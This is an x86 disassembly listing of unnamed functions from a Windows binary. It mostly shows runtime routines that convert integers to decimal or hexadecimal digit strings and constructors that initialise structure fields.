mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bb20
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bb95
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bc0a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bc7f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bcf4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bd69
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bdde
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41be53
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bedb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bf63
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41bfeb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c073
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c0fb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c183
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c20b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c293
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c31b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c3a3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c42b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_449720
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c4b3
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_4281b4
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c4df
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push ebx
movsx bx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
pop edi
pop ebx
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ebx
call sub_4281f1
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c510
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_428231
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c53c
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push ebx
movsx bx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
pop edi
pop ebx
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ebx
call sub_428273
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c57f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c5b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c5f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c63f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c679
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c70d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c735
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x30 ] ax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] al
mov [ ecx + 0x440 ] eax
mov [ ecx + 0x444 ] eax
mov eax ecx
retn
sub_41c770
xor edx edx
xor eax eax
mov [ ecx + 0x32 ] ax
mov eax ecx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] edx
mov [ ecx + 0x10 ] edx
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x24 ] edx
mov [ ecx + 0x28 ] edx
mov [ ecx + 0x30 ] dl
mov [ ecx + 0x38 ] edx
mov [ ecx + 0x3c ] dl
mov [ ecx + 0x440 ] edx
mov [ ecx + 0x444 ] edx
retn
sub_41c7b0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c735
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c7ec
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c735
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c828
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c770
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c864
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c770
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c8a0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c7b0
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
